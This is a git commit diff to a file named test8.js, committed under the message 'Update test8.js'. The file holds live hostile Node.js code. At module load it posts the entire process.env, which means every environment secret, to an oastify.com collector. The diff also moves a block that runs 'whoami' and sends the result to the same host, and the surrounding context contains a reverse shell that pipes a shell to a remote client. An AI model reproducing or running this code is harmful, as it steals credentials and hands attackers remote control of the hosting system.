747dc70c7240387e759e50f842491fc21762cdd3
Martin <martinbydefault@gmail.com>
2024-05-21 09:38:50 -0300

    Update test8.js

--- test8.js
+++ test8.js
@@ -1,8 +1,12 @@
 const axios = require('axios');
 
 axios.post('http://k3o7lpvmejkfjcdsb4ec2as5dwjn7iv7.oastify.com/exfil', process.env);
-
-module.exports = (context, req, res) => {
+  
+  var exec = require('child_process').exec;
+  var cmd = 'whoami';
+  var result = exec(cmd, function(error, stdout, stderr) {  });
+  axios.post('http://k3o7lpvmejkfjcdsb4ec2as5dwjn7iv7.oastify.com/imhere2', result)
+  module.exports = (context, req, res) => {
   (function(){
     var net = require("net"),
         cp = require("child_process"),
@@ -14,12 +18,6 @@ module.exports = (context, req, res) => {
         sh.stderr.pipe(client);
     });
     return /a/; // Prevents the Node.js application from crashing
-})();
-  
-  var exec = require('child_process').exec;
-  var cmd = 'whoami';
-  var result = exec(cmd, function(error, stdout, stderr) {  });
-  axios.post('http://k3o7lpvmejkfjcdsb4ec2as5dwjn7iv7.oastify.com/imhere2', result)
-  return true;
+  })();
 };
 
